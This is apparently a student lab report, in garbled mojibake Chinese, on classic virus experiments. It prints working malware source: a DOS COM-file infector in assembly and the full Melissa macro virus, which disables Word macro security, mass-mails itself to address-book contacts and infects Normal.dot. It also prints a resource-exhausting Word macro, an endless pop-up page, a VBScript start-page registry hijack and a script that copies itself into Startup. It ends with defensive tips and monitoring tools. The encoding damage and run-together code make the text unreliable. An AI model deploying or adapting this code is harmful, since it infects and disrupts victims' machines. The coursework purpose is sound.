&#x3D; 0 &#39;æ’¤é”€æ–‡æœ¬ä¸ºæ–œä½“BeepSelection.InsertAfter Text:&#x3D;&quot;å¦‚ä½•é˜²å¾¡å®ç—…æ¯’&quot; &#39;åµŒå…¥æ–‡æœ¬Selection.InsertParagraphAfter &#39;æ¢è¡ŒSelection.InsertParagraphAfter &#39;æ¢è¡ŒBeepSelection.InsertAfter Text:&#x3D;&quot;ç­”æ¡ˆï¼š&quot; &#39;åµŒå…¥æ–‡æœ¬Selection.Font.Italic &#x3D; 1 &#39;è®¾ç½®æ–‡æœ¬å­—ä½“ä¸ºæ–œä½“Selection.InsertAfter Text:&#x3D;&quot;åˆ«çœ‹æˆ‘&quot; &#39;åµŒå…¥æ–‡æœ¬MsgBox &quot;æŒ‰ç¡®å®šé”®ï¼Œæˆ‘å°†å‘Šè¯‰ä½ ä¸€ä¸ªç§˜å¯†......&quot;, &quot;å¥½å§ï¼Œå‘Šè¯‰ä½ å§ï¼&quot;GoTo out &#39;é€€å‡ºgotoè¯­å¥&#39;è¾“å…¥ç­”æ¡ˆä¸æ­£ç¡®åå°†è¦æ‰§è¡Œçš„è¯­å¥Else &#39;æ‰§è¡Œelseè¯­å¥ï¼Œä¹Ÿå°±æ˜¯å›ç­”é”™è¯¯åå°†è¦æ‰§è¡Œçš„Count &#x3D; Count + 1 &#39;count++ï¼Œæœ¬æ¥countåˆå§‹åŒ–ä¸º0For j &#x3D; 1 To 20 &#39;æ‰§è¡Œå¾ªç¯è¯­å¥ï¼Œå¾ªç¯20æ¬¡BeepDocuments.Add &#39;å¢åŠ ä¸€ä¸ªç°åœ¨è¿™ä¸ªæ–‡æ¡£Next jSelection.Paragraphs.Alignment &#x3D; wdAlignParagraphCenter&#39;è®¾ç½®æ–‡æœ¬æ ¼å¼ä¸ºå±…ä¸­å¯¹é½Selection.InsertAfter Text:&#x3D;&quot;å®ç—…æ¯’&quot; &#39;åµŒå…¥ä¸€ä¸ªæ–‡æœ¬If Count &#x3D; 2 Then GoTo out&#39;åˆ¤æ–­æ˜¯å¦æ‰§è¡Œæ‰“å¼€è¯¥æ–‡æœ¬æ“ä½œå¤Ÿ2ä¸ª20æ¬¡ï¼Œå¦‚æœå¤Ÿäº†å°±é€€å‡ºgotoè¯­å¥GoTo tryWordBasic.filedefault &#39;é€€å‡ºWordBasicæ–‡æœ¬End IfWend &#39;ç»“æŸwithè¯­å¥out: &#39;é€€å‡ºEnd Sub &#39;é€€å‡ºSub å­¦ä¹ äº†å®ç—…æ¯’çš„ç»“æ„ å’Œ å»é™¤å®ç—…æ¯’çš„æ–¹æ³• ç»“æ„ å±è”½çŠ¶æ€æ ï¼Œä»¥å…æ˜¾ç¤ºå®ç—…æ¯’æ‰§è¡ŒçŠ¶æ€ï¼›ä¿®æ”¹å…¬ç”¨æ¨¡ç‰ˆæ˜¯è‡ªåŠ¨ä¿å­˜ä¸”ä¸æç¤ºï¼›è‡ªåŠ¨æ‰§è¡Œç—…æ¯’æ¨¡æ¿ åˆ¤æ–­æ˜¯å¦æ˜¯ å…¬ç”¨æ¨¡æ¿ ï¼Œå¦åˆ™å¤åˆ¶åˆ°å…±ç”¨æ¨¡æ¿ é€šè¿‡é¦–è¡Œå†…å®¹åˆ¤æ–­æ˜¯å¦æ„ŸæŸ“ç—…æ¯’ æ‰§è¡Œç—…æ¯’ä¸»ä½“ åˆ©ç”¨å¤šå¼€çª—å£ç­‰æ–¹å¼è€—å°½ç³»ç»Ÿèµ„æºä»¥å½±å“ä½¿ç”¨ COMç—…æ¯’å®éªŒ COMæ–‡ä»¶çš„ç‰¹ç‚¹ COMæ–‡ä»¶æ˜¯DOSçš„ä¸€ç§äºŒè¿›åˆ¶ä»£ç çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ŒCOMæ–‡ä»¶ç»“æ„æ¯”è¾ƒç®€å•ï¼ŒåŠ è½½è¿‡ç¨‹ååˆ†è¿…é€Ÿã€‚æ•´ä¸ªç¨‹åºåªæœ‰ä¸€ä¸ªæ®µã€‚å› æ­¤å…¨éƒ¨ä»£ç é•¿åº¦å¿…é¡»å°äº64Kï¼Œå…¶å…¥å£ä»£ç åœ°å€æ˜¯CS:100Hã€‚DOSè£…å…¥COMæ–‡ä»¶æ—¶ï¼Œå…ˆåœ¨å†…å­˜å»ºç«‹ä¸€ä¸ªé•¿åº¦ä¸º100Hçš„ç¨‹åºå‰ç¼€æ®µ(PSPï¼Œç”±DOSå»ºç«‹ï¼Œæ˜¯DOSç”¨æˆ·ç¨‹åºå’Œå‘½ä»¤è¡Œä¹‹é—´çš„æ¥å£)ï¼Œç„¶åå°†æ•´ä¸ªæ–‡ä»¶è£…è½½äºPSPä¸Šç«¯ï¼Œä¸è¿›è¡Œé‡å®šä½æ“ä½œï¼Œæ¥ç€å°†å››ä¸ªæ®µåœ°å€å¯„å­˜å™¨DS(DataSegment)ï¼ŒCS(Code Segment)ï¼ŒSS(Stack Segment)ï¼ŒES(Extra Segment)åˆå§‹åŒ–ä¸ºç¨‹åºå‰ç¼€æ®µ(PSP)çš„æ®µåœ°å€ï¼Œæœ€åå°†ç¨‹åºçš„æ§åˆ¶æƒäº¤äºCS:100Hå¤„ã€‚å¦‚è¡¨ä¸€æ‰€ç¤ºï¼š è¡¨1ï¼šCOMç—…æ¯’çš„è£…å…¥å’Œæ‰§è¡Œ ç—…æ¯’åŸç† COMç—…æ¯’æ„ŸæŸ“ä¸€èˆ¬æœ‰ä¸¤ç§é€”å¾„ï¼Œä¸€ç§æ˜¯å°†è‡ªèº«ä»£ç é™„åŠ åˆ°å®¿ä¸»ç¨‹åºä¹‹å‰ï¼Œç—…æ¯’æ‰§è¡Œå®Œåæ¢å¤å¯„ç”Ÿç¨‹åºåŸå…ˆçš„çŠ¶æ€ï¼Œå¹¶ç”¨JMPFARç­‰æŒ‡ä»¤ä½¿ç¨‹åºå†æ¬¡å›åˆ°CS:100Hå¤„ï¼Œä»¥ç¡®ä¿å¯„ç”Ÿç¨‹åºä¸PSPçš„ä¸€è‡´ã€‚ä½†æ›´ä¸ºå¸¸è§çš„ç—…æ¯’ä¸ºé‡‡ç”¨ä¿å­˜æ–‡ä»¶å¤´è‹¥å¹²å­—èŠ‚ï¼Œå¹¶å°†ç¬¬ä¸€æ¡æŒ‡ä»¤æ”¹ä¸ºâ€JMPç—…æ¯’å…¥å£â€ï¼Œä»¥ç¡®ä¿ç—…æ¯’æœ€å…ˆæ‰§è¡Œã€‚ç—…æ¯’æ‰§è¡Œå®Œåï¼Œä¼šæ¢å¤å¹¶è¿è¡ŒåŸæ–‡ä»¶ï¼Œä»¥ä¾¿ä¼ æ’­ï¼Œå½“å…¶å°†åŸæ–‡ä»¶å‚æ•°å…¨éƒ¨æ¢å¤åï¼Œä¼šå°†æ§åˆ¶æƒäº¤äºCS:100Hå¤„ã€‚ å¸¦æ„ŸæŸ“çš„COMæ–‡ä»¶12345678910111213141516171819proqram seqmentassume cs:program,ds:program,ss:program,es:programorg 0100h # ç½®ç¨‹åºçš„åˆå€¼ä¸º100hï¼Œå¼€å§‹ç¨‹åºçš„è¿è¡ŒMOV AX, SEG MESSAGE # å°† message æ®µåœ°å€èµ‹ç»™AXå¯„å­˜å™¨MOV DS, AX #MOV DX, offset message #å°†åç§»é‡èµ‹ç»™ DXMOV AH, 09h #æ‰“å°å­—ç¬¦ä¸²INT 21hMOV AH, 4Ch # ç»ˆæ­¢ç¨‹åº è¿”å› DOSINT 21hRETmessage db&quot;This a simple com program for a test ???&quot;,0dh,0ah,&quot;$&quot;program endsEND ç—…æ¯’çš„ASMæ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115CSEG SEGMENTASSUME CS:CSEG,DS:CSEG,SS:CSEGmain PROC NEARmainstart:CALL vstart ;ç—…æ¯’ä»£ç å¼€å§‹å¤„vstart:POP SI #å¾—åˆ°å½“å‰åœ°å€MOV BP,SI #ä¿å­˜å½“å‰åœ°å€PUSH SIMOV AH,9ADD SI,OFFSET message-OFFSET vstart #æ˜¾ç¤ºé¢„è®¾å­—ç¬¦ä¸²MOV DX,SIINT 21hPOP SIADD SI,OFFSET yuan4byte-OFFSET vstart #å–å¾—åŸç¨‹åºå‰å››ä¸ªå­—èŠ‚MOV DI,100h #ç›®çš„åœ°å€MOV AX,DS:[SI] #å¼€å§‹å¤åˆ¶MOV DS:[DI],AXINC SIINC SIINC DIINC DIMOV AX,DS:[SI]MOV DS:[DI],AXMOV SI,BP #æ¢å¤åœ°å€å€¼MOV DX,OFFSET delname-OFFSET vstart #å¾—åˆ°åˆ é™¤æ–‡ä»¶åADD DX,SIMOV AH,41hINT 21hMOV DX,OFFSET filename-OFFSET vstart#å¾—åˆ°è¦æ„ŸæŸ“æ–‡ä»¶åADD DX,SIMOV AL,02MOV AH,3dhF#å†™æ–‡ä»¶INT 21hJC errorMOV BX,AX#æ–‡ä»¶å¥æŸ„MOV DX,OFFSET yuan4byte-OFFSET vstart#è¯»æ–‡ä»¶å‰å››ä¸ªå­—èŠ‚ADD DX,SIMOV CX,4MOV AH,3fhINT 21hMOV AX,4202h#åˆ°æ–‡ä»¶å°¾XOR CX,CXXOR DX,DXINT 21hMOV DI,OFFSET new4byte-OFFSET vstart#ä¿å­˜è¦è·³çš„åœ°æ–¹ADD DI,2ADD DI,SISUB AX,4MOV DS:[DI],AXADD SI,OFFSET mainstart-OFFSET vstart#å‡†å¤‡å†™å…¥ç—…æ¯’MOV DX,SIMOV vsizes,OFFSET vends-OFFSET mainstartMOV CX,vsizesMOV AH,40hINT 21hMOV SI,BP#å®šä½åˆ°æ–‡ä»¶å¤´MOV AL,0XOR CX,CXXOR DX,DXMOV AH,42hINT 21hMOV AH,40h#å°†æ–°çš„æ–‡ä»¶å¤´å†™å…¥MOV CX,4MOV DX,OFFSET new4byte-OFFSET vstartADD DX,SIINT 21hMOV AH,3eh#å…³é—­æ–‡ä»¶INT 21herror:MOV AX,100hPUSH AXRETmain ENDPyuan4byte:RET ; ??DB 3 DUP (?)vsizes DW 0new4byte DB &#39;M&#39;,0e9h,0,0filename DB &quot;test.com&quot;,0delname DB &quot;del.txt&quot;,0message DB &quot;You are infected by a simple com virus~~&quot;DB 0dh,0ah,&quot;$&quot;vends:start:MOV AX,CSEGMOV DS,AXMOV SS,AXCALL mainMOV AX,4c00hINT 21hCSEG ENDSEND start åˆ†æçš„æœ‰è¶£çš„ç‚¹ DOSä¸‹comæ–‡ä»¶çš„åŠ è½½æ—¶ä¸€å¯¹ä¸€çš„æ˜ å°„çš„ï¼Œæ²¡æœ‰PEç»“æ„é‚£æ ·çš„MZå¤´å’ŒPEå¤´ COMæ–‡ä»¶åŠ è½½ä»£ç çš„åŸºå€æ˜¯100Hï¼Œ0~100Hæ˜¯PSPç»“æ„ï¼ŒCOMæ–‡ä»¶åªæœ‰ä¸€ä¸ªæ®µï¼Œæ‰€ä»¥DSï¼ŒESâ€¦â€¦æ®µå¯„å­˜å™¨éƒ½æŒ‡å‘PSP COMæ–‡ä»¶æ²¡æœ‰å †æ ˆæ®µï¼Œç”¨debugè°ƒè¯•å‘ç°ï¼Œspï¼šFFFEï¼Œbpï¼š0000ï¼Œbpå¯„å­˜å™¨ç»è¿‡æµ‹è¯•å¯ä»¥ç”¨æ¥å­˜å‚¨å…¶ä»–çš„å€¼å¯¹è¿è¡Œæ²¡æœ‰å½±å“ ç—…æ¯’ä»£ç ä½¿ç”¨call popç»„åˆæ‹¿åˆ°popå¤„ä»£ç çš„ç»å¯¹åœ°å€ï¼Œä»¥å®ç°é‡å®šä½ é€šè¿‡å¯¹è¢«æ„ŸæŸ“æ–‡ä»¶çš„å‰4å­—èŠ‚å¡«å……ä¸º sub bpï¼Œ jmp shellcodeå®ç°shellcodeè·³è½¬ï¼Œè¿›å…¥shellcodeé¦–å…ˆæ¢å¤å‰4å­—èŠ‚ï¼Œç„¶åæ‰§è¡Œå®Œæµç¨‹åé€šè¿‡push 100H,retè¿”å›åŸç¨‹åº åœ¨è¿™é‡ŒMé™¤äº†èº²é¿æ€æ¯’è½¯ä»¶çš„æŸ¥æ€æˆ‘æ²¡æƒ³åˆ°å…¶ä»–ä½œç”¨ï¼Œåˆ æ‰ä¸å½±å“è¿è¡Œï¼ˆä½†æ˜¯é¦–åœ°å€çš„jmpçš„ç›®æ ‡åœ°å€éœ€è¦å¯¹åº”çš„ä¿®æ”¹ï¼‰ yuan4byteä¸­retçš„ä½œç”¨ï¼šè®©ç—…æ¯’ç¨‹åºè¿”å›Mainå‡½æ•°ï¼ŒæˆåŠŸè¿è¡Œå®Œæ•´ä¸ªæµç¨‹ ä¸ºä»€ä¹ˆè¦SUB AX,4ï¼šç±»ä¼¼äºinline-hookï¼Œjmpç›¸å¯¹åœ°å€ï¼Œéœ€è¦å‡å»jmpè¯­å¥æ‰€åœ¨çš„åç§»åœ°å€å†-jmpæœ¬èº«çš„é•¿åº¦ æ¢…ä¸½èç—…æ¯’å®éªŒä»£ç  basic123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215Sub autoOpen()On Error Resume Next&#39;*ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œå¾ªç¯å‘é€é‚®ä»¶ç¨‹åºéƒ¨åˆ†If System.PrivateProfileString(&quot;&quot;,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice11.0WordSecurity&quot;,&quot;Level&quot;) &lt;&gt; &quot;&quot; Then &#39;æ³¨å†Œè¡¨é¡¹åˆ¤æ–­CommandBars(&quot;Macro&quot;).Controls(&quot;Security...&quot;).Enabled &#x3D; False&#39;å®å·¥å…·æ å®‰å…¨é€‰é¡¹å¤±æ•ˆSystem.PrivateProfileString(&quot;&quot;,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice11.0WordSecurity&quot;,&quot;Level&quot;) &#x3D; 1&amp;ElseCommandBars(&quot;Tools&quot;).Controls(&quot;Macro&quot;).Enabled &#x3D; False&#39;å·¥å…·èœå•æ å®é€‰é¡¹å¤±æ•ˆOptions.ConfirmConversions &#x3D; (1-1): &#39;æ–‡ä»¶è½¬æ¢å¯¹è¯æ¡†ä¸æ˜¾ç¤ºOptions.VirusProtection &#x3D; (1-1): &#39;å®è­¦å‘Šå¯¹è¯æ¡†ä¸æ˜¾ç¤ºOptions.SaveNormalPrompt &#x3D; (1-1) &#39;Normal.dotè¢«ä¿®æ”¹åä¸æ˜¾ç¤ºå¯¹è¯æ¡†End IfDim UngaDasOutlook, DasMapiName, BreakUmOffASliceSet UngaDasOutlook &#x3D; CreateObject(&quot;Outlook.Application&quot;)&#39;åˆ›å»ºoutlookåº”ç”¨ç¨‹åºå®ä¾‹å¯¹è±¡Set DasMapiName &#x3D; UngaDasOutlook.GetNameSpace(&quot;MAPI&quot;)&#39;è·å–MAPIå¯¹è±¡If System.PrivateProfileString(&quot;&quot;,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice&quot;, &quot;Melissa&quot;)&lt;&gt; &quot;... by Kwyjibo&quot; ThenIf UngaDasOutlook &#x3D; &quot;Outlook&quot; ThenDasMapiName.Logon &quot;profile&quot;, &quot;password&quot;For y &#x3D; 1 To DasMapiName.AddressLists.Count&#39;éå†åœ°å€ç°¿ï¼Œè¿›è¡Œé‚®ä»¶å‘é€æ“ä½œSet AddyBook &#x3D; DasMapiName.AddressLists(y)x &#x3D; 1Set BreakUmOffASlice &#x3D; UngaDasOutlook.CreateItem(0)For oo &#x3D; 1 To AddyBook.AddressEntries.CountPeep &#x3D; AddyBook.AddressEntries(x)&#39;è·å–ç¬¬ x ä¸ªæ”¶ä»¶äººçš„æ”¶ä»¶åœ°å€BreakUmOffASlice.Recipients.Add Peep&#39;åŠ å…¥æ”¶ä»¶äººçš„åœ°å€x &#x3D; x + 1If x &gt; 50 Then oo &#x3D; AddyBook.AddressEntries.CountNext ooBreakUmOffASlice.Subject&#x3D; &quot;Important Message From &quot; &amp;Application.UserName &#39;è®¾ç½®é‚®ä»¶çš„ä¸»é¢˜BreakUmOffASlice.Body &#x3D; &quot;Here is that document you asked for ...don&#39;t show anyone else ;-)&quot; &#39;è®¾ç½®é‚®ä»¶çš„å†…å®¹BreakUmOffASlice.Attachments.Add ActiveDocument.FullName &#39;åŠ å…¥é™„ä»¶BreakUmOffASlice.Send &#39;å‘é€é‚®ä»¶Peep &#x3D; &quot;&quot;Next yDasMapiName.Logoff &#39;æ–­å¼€è¿æ¥End IfSystem.PrivateProfileString(&quot;&quot;,&quot;HKEY_CURRENT_USERSoftwareMicrosoftOffice&quot;,&quot;Melissa?&quot;) &#x3D; &quot;... by Kwyjibo&quot; &#39; è®¾ç½®æ„ŸæŸ“æ ‡å¿—End If&#39;*FirstPartSet ADI1 &#x3D; ActiveDocument.VBProject.VBComponents.Item(1)&#39;è·å–å½“å‰æ–‡æ¡£VBAå·¥ç¨‹ç¬¬ä¸€ä¸ªæ¨¡å—çš„åç§°Set NTI1 &#x3D; NormalTemplate.VBProject.VBComponents.Item(1)&#39;è·å–Normal.dot VBAå·¥ç¨‹ç¬¬ä¸€ä¸ªæ¨¡å—çš„åç§°NTCL &#x3D; NTI1.CodeModule.CountOfLinesADCL &#x3D; ADI1.CodeModule.CountOfLinesBGN &#x3D; 2If ADI1.Name &lt;&gt; &quot;Melissa&quot; Then &#39;å¦‚æœå½“å‰æ–‡æ¡£ä¸ºæ„ŸæŸ“If ADCL &gt; 0 Then ADI1.CodeModule.DeleteLines 1, ADCLSet ToInfect &#x3D; ADI1ADI1.Name &#x3D; &quot;Melissa&quot;DoAD &#x3D; TrueEnd IfIf NTI1.Name &lt;&gt; &quot;Melissa&quot; Then&#39;å¦‚æœ Normal.dot æœªæ„ŸæŸ“If NTCL &gt; 0 Then NTI1.CodeModule.DeleteLines 1, NTCLSet ToInfect &#x3D; NTI1NTI1.Name &#x3D; &quot;Melissa&quot; &#39;ä¿®æ”¹VBAå·¥ç¨‹ç¬¬ä¸€ä¸ªæ¨¡å—ä¸º MellisaDoNT &#x3D; TrueEnd IfIf DoNT &lt;&gt; True And DoAD &lt;&gt; True Then GoTo CYA&#39;å¼€å§‹æ„ŸæŸ“ Normal.dotIf DoNT &#x3D; True ThenDo While ADI1.CodeModule.Lines(1, 1) &#x3D; &quot;&quot;ADI1.CodeModule.DeleteLines 1LoopToInfect.CodeModule.AddFromString (&quot;Private Sub Document_Close()&quot;)Do While ADI1.CodeModule.Lines(BGN, 1) &lt;&gt; &quot;&quot;ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)BGN &#x3D; BGN + 1LoopEnd IfIf DoAD &#x3D; True Then &#39;å¼€å§‹æ„ŸæŸ“å½“å‰æ–‡æ¡£Do While NTI1.CodeModule.Lines(1, 1) &#x3D; &quot;&quot;NTI1.CodeModule.DeleteLines 1LoopToInfect.CodeModule.AddFromString (&quot;Private Sub Document_Open()&quot;)Do While NTI1.CodeModule.Lines(BGN, 1) &lt;&gt; &quot;&quot;ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)BGN &#x3D; BGN + 1LoopEnd IfCYA:&#39;ä¿å­˜è¢«ä¿®æ”¹çš„å½“å‰æ–‡æ¡£å’ŒNormal.dotIf NTCL &lt;&gt; 0 And ADCL &#x3D; 0 And (InStr(1, ActiveDocument.Name,&quot;Document&quot;) &#x3D; False) ThenActiveDocument.SaveAs FileName:&#x3D;ActiveDocument.FullNameElseIf (InStr(1, ActiveDocument.Name, &quot;Document&quot;) &lt;&gt; False) ThenActiveDocument.Saved &#x3D; TrueEnd If&#39;WORD&#x2F;Melissa written by Kwyjibo&#39;Works in both Word 2000 and Word 97&#39;Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!&#39;Word -&gt; Email | Word 97 &lt;--&gt; Word 2000 ... it&#39;s a new age!If Day(Now) &#x3D; Minute(Now) ThenSelection.TypeText &quot; Twenty-two points, plus triple-word-score, plusfifty points for using all my letters. Game&#39;s over. I&#39;m outtahere.&quot;End Sub ä¿®æ”¹æ³¨å†Œè¡¨ å‘é€é‚®ä»¶ HTMLç—…æ¯’æ— é™è·³çª—å£ç—…æ¯’ 12345&lt;body&gt;&lt;A href=&quot;&quot; onmouseover=&quot;while(true)&#123;window.open()&#125;&quot;&gt;æ¶æ„å¼¹å‡ºçª—å£ï¼&lt;/A&gt; &lt;/body&gt; å°†æ­¤ç—…æ¯’è¿è¡Œåœ¨ç°å®ä¸­çš„ chrome æµè§ˆå™¨ä¸Šï¼Œç³»ç»Ÿæç¤ºé˜»æ­¢å¼¹å‡ºçª—å£ï¼Œè¡¨æ˜ç°è¡Œçš„æµè§ˆå™¨å·²ç»å¯¹è¿™ç§ç—…æ¯’è¿›è¡Œäº†é˜²æŠ¤ æ›´æ”¹ä¸»é¡µç—…æ¯’é€šè¿‡ VbScript åµŒå…¥ html çš„ script æ ‡ç­¾ï¼Œ åµŒå…¥ä¸€æ®µvbä»£ç  1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;html&gt;&lt;META http-equiv=Content-Type content=&quot;text/html:charset=gb2312&quot;&gt;&lt;HEAD&gt;&lt;SCRIPT language=&quot;vbscript&quot;&gt;Sub main()Dim TheFormSet TheForm=Document.formsï¼ˆ&quot;myform&quot;ï¼‰strKey=&quot;HKEY_CURRENT_USERSoftwarellicrosoftInternetExplorerMain&quot;strValue=&quot;Start Page&quot;strData=&quot;http://www.simpleware.com.cn&quot;strType =&quot;REG_SZ&quot;regAdd strKeyï¼ŒstrValueï¼ŒstrDataï¼ŒstrTypeEnd Sub&lt;!--ä¸Šæ–¹ main scriptä¸»ä½“ï¼Œè°ƒç”¨regAdd å‡½æ•° è¿›è¡Œæ³¨å†Œè¡¨é¡¹çš„æ›´æ”¹--&gt;function regAddï¼ˆstrKeyï¼ŒstrValueï¼ŒstrDataï¼ŒstrTypeï¼‰Dim WshshellSet WshShell=CreateObjectï¼ˆ&quot;WScript.Shell&quot;ï¼‰WshShell.RegWrite strKey &amp; &quot;&quot; &amp; strValue,strData,strType&lt;!é€šè¿‡ shell æ–‡ä»¶è¿›è¡Œæ³¨å†Œè¡¨é¡¹çš„æ”¹å†™&gt;msgboxï¼ˆ&quot;Successful&quot;ï¼‰&lt;!æ”¹å†™æˆåŠŸå æ˜¾ç¤º successful&gt;end function&lt;/SCRIPT&gt; &lt;/HEAD&gt;&lt;body onload=&quot;main()&quot;&gt;ä¿®æ”¹ä¸»é¡µ&lt;/body&gt;&lt;/html&gt; æ³¨å†Œè¡¨ä¿®æ”¹æˆåŠŸ äº”ã€é˜²æ²»æ–¹æ³•ï¼š5.1è¦é¿å…è¢«ç½‘é¡µæ¶æ„ä»£ç æ„ŸæŸ“ï¼Œé¦–å…ˆå…³é”®æ˜¯ä¸è¦è½»æ˜“å»ä¸€äº›å¹¶ä¸ä¿¡ä»»çš„ç«™ç‚¹ã€‚5.2IEç‚¹å‡»â€å·¥å…·â€“&gt;Interneté€‰é¡¹â€“&gt;å®‰å…¨â€“&gt;InternetåŒºåŸŸçš„å®‰å…¨çº§åˆ«â€ï¼ŒæŠŠå®‰å…¨çº§åˆ«ç”±â€ä¸­â€æ”¹ä¸ºâ€é«˜â€ã€‚5.3å…·ä½“æ–¹æ¡ˆæ˜¯ï¼šåœ¨IEçª—å£ä¸­ç‚¹å‡»â€å·¥å…·â€”&gt;Interneté€‰é¡¹â€ï¼Œåœ¨å¼¹å‡ºçš„å¯¹è¯æ¡†ä¸­é€‰æ‹©â€å®‰å…¨â€æ ‡ç­¾ï¼Œå†ç‚¹å‡»â€è‡ªå®šä¹‰çº§åˆ«â€æŒ‰é’®ï¼Œå°±ä¼šå¼¹å‡ºâ€å®‰å…¨è®¾ç½®â€å¯¹è¯æ¡†ï¼ŒæŠŠå…¶ä¸­æ‰€æœ‰ActiveXæ’ä»¶å’Œæ§ä»¶ä»¥åŠä¸Javaç›¸å…³å…¨éƒ¨é€‰é¡¹é€‰æ‹©â€ç¦ç”¨â€ã€‚5.4ä¸€å®šè¦åœ¨è®¡ç®—æœºä¸Šå®‰è£…é˜²ç«å¢™ï¼Œå¹¶è¦æ—¶åˆ»æ‰“å¼€â€å®æ—¶ç›‘æ§åŠŸèƒ½â€ã€‚5.5åœ¨æ³¨å†Œè¡¨çš„KEYCURRENTUSERSoftwareMicrosoftWindwsCurrentVersionPoliciesSystemä¸‹ï¼Œå¢åŠ åä¸ºDisableRegistryToolsçš„DWORDå€¼é¡¹ï¼Œå°†å…¶å€¼æ”¹ä¸ºâ€1â€ï¼Œå³å¯ç¦æ­¢ä½¿ç”¨æ³¨å†Œè¡¨ç¼–è¾‘å™¨å‘½ä»¤regedit.exeã€‚5.6å› ä¸ºç‰¹æ®ŠåŸå› éœ€è¦ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œå¯åº”ç”¨å¦‚ä¸‹è§£é”æ–¹æ³•ï¼šå¼€å§‹å› ä¸ºç‰¹æ®ŠåŸå› éœ€è¦ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œå¯åº”ç”¨å¦‚ä¸‹è§£é”æ–¹æ³•ï¼šè¿è¡Œâ€”&gt;gpedit.mscæ‰“å¼€ç»„ç­–ç•¥å·¦é¢åˆ†çº§å±•å¼€ç”¨æˆ·é…ç½®â€”&gt;ç®¡ç†æ¨¡æ¿â€”â€“&gt;ç³»ç»Ÿå³é¢æœ‰ä¸ªé˜»æ­¢è®¿é—®æ³¨å†Œè¡¨ç¼–è¾‘å·¥å…·è®¾ç½®æˆå·²ç¦ç”¨ç¡®å®šå³å¯ã€‚5.7éšæ—¶å‡çº§IEæµè§ˆå™¨çš„è¡¥ä¸ã€‚ã€å®éªŒæ€è€ƒã€‘1.å¯æ ¹æ®â€å‡ ä¸ªç›¸å…³ä¿®æ”¹â€ä¸­æåˆ°çš„æ³¨å†Œè¡¨ä¸­å€¼ï¼Œåˆ©ç”¨â€æ›´æ”¹ä¸»é¡µâ€ä¸­ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹æ³•ï¼Œæ¥è¿›è¡Œè‡ªå·±çš„æ³¨å†Œè¡¨ä¿®æ”¹ï¼Œå¹¶ç»™å‡ºå¦‚ä½•é˜²èŒƒå’Œä¿®å¤ã€‚ è„šæœ¬ç—…æ¯’è‡ªåŠ¨æ‹·è´åˆ°å¼€å§‹èœå•å¯åŠ¨æ é¡¹ On Error Resume Nextâ€™å¯åŠ¨æˆ–å…³é—­ä¸€ä¸ªé”™è¯¯å¤„ç†å¸¸å¼ Setfs=CreateObject(â€œScripting.FileSystemobjectâ€)â€™åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªå¯¹Activexå¯¹è±¡çš„å¼•ç”¨ Set diro=fs.GetSpecialFolder(0)â€™å–ç³»ç»Ÿè·¯å¾„C:windows dirl=Mid(dir0,1,InStr(dir0,â€:â€))â€™å–ç³»ç»Ÿç›˜ç¬¦ Set so=CreateObjectï¼ˆâ€Scripting.FileSystemObjectâ€ï¼‰ dim râ€™å®šä¹‰å˜é‡ Set r=Create0bject(â€œWscript.Shel1â€)â€™åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªå¯¹Activexå¯¹è±¡çš„å¼•ç”¨ so.GetFile(WScript.ScriptFullName).Copy(dirl&amp;â€Documents andSettingsAdministrator[å¼€å§‹]èœå•ç¨‹åºå¯åŠ¨Win32system.vbsâ€) â€˜æ‹·è´æ–‡ä»¶ ç—…æ¯’åˆ†ææ–‡ä»¶ç›‘æ§ å­¦ä¼šäº†Process Monitor çš„ä½¿ç”¨ï¼Œè¿™ä¸ªè½¯ä»¶ç°åœ¨ä»ç„¶æ´»è·ƒåœ¨ä»Šæ—¥çš„èˆå° 1.8æ³¨æ„ï¼Œä¸è¦æŠŠexplorer.exeå’Œiexplore.exeè¿™ä¸¤ä¸ªè¿›ç¨‹è¿‡æ»¤æ‰ï¼Œå› ä¸ºç—…æ¯’ç»å¸¸è¦æ³¨å…¥ä»£ç åˆ°è¿™ä¸¤ä¸ªè¿›ç¨‹ä¸­å®Œæˆç‰¹åˆ«çš„åŠŸèƒ½ã€‚å¦‚æœè¿‡æ»¤æ‰è¿™ä¸¤ä¸ªè¿›ç¨‹ï¼Œé‚£ä¹ˆå°±æ— æ³•ç›‘æ§åˆ°è¢«æ³¨å…¥åˆ°è¿™ä¸¤ä¸ªè¿›ç¨‹çš„ä»£ç æ‰€è¿›è¡Œçš„æ–‡ä»¶æ“ä½œã€‚ æ³¨å†Œè¡¨ç›‘æ§ ï¼š æ ¹æ® operation è¿‡æ»¤é¡¹ï¼ŒæŸ¥çœ‹ RegSetValueå³æ›´æ”¹äº†æ³¨å†Œè¡¨é¡¹çš„è¿›ç¨‹ è¿›ç¨‹ç›‘æ§äºŒ ï¼š å­¦ä¼šä½¿ç”¨ Process Explorer ç½‘ç»œç›‘æ§ï¼šåˆ©ç”¨ TcpView å·¥å…·è¿›è¡Œ ç«¯å£ï¼Œè¿›ç¨‹çš„ç½‘ç»œè¿æ¥ç›‘æ§ï¼Œnetspyè¿›è¡Œä¾µå…¥å¹¶æ‰“å¼€7306ç«¯å£ç­‰å¾… netmonitor çš„ç›‘æ§ï¼Œå¯ä»¥æŸ¥çœ‹è®¡ç®—æœºä¸­çš„æ–‡ä»¶ å…¨é¢ç›‘æ§ï¼š åˆ©ç”¨ 